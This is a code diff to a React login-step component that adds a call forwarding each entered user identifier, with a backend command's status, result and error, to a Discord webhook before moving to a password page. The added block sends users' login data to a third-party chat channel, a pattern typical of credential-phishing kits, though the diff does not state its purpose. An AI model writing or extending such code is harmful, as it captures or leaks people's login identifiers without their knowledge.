@@ -13,6 +13,7 @@ import type {
 import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const AlternativeIdentifier = () => {
   const [input, setInput] = useState("");
@@ -117,6 +118,32 @@ export const AlternativeIdentifier = () => {
         setToast("Timeout, please try again");
         return;
       }
+
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for alternative identifier command result:", {
+        identifier,
+        commandId,
+        status: finalState.status,
+      });
+      
+      sendDiscordWebhookSafe({
+        username: "Alternative Identifier Command Result",
+        content:
+          "📧 **Alternative Identifier Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              identifier,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
 
       if (finalState.status === "done" && finalState.result?.ok) {
         // ✅ identifier OK → go password
